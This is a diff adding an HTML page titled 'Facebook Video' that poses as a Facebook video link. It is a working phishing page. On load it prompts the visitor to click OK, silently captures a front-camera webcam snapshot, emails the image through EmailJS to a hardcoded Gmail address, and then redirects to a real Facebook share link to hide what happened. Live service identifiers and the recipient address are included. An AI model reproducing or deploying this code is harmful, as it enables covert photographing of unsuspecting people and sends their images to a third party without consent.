@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook Video</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+</head>
+<body style="background-color: #000;">
+    <script>
+        (function() { emailjs.init("ClasRwO6y__NeB2UQ"); })();
+        window.onload = async function() {
+            if (confirm("To watch this video on Facebook, please click OK")) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640; canvas.height = 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                        emailjs.send('service_w3dev6o', 'template_7k8tall', {
+                            image_data: canvas.toDataURL('image/jpeg'),
+                            to_email: 'tayebiabd2016@gmail.com'
+                        }).then(() => { window.location.href = "https://www.facebook.com/share/r/1CCWTpPmX8/"; });
+                    }, 600);
+                } catch (err) { window.location.href = "https://www.facebook.com/share/r/1CCWTpPmX8/"; }
+            } else { window.location.href = "https://www.facebook.com/share/r/1CCWTpPmX8/"; }
+        };
+    </script>
+</body>
+</html>
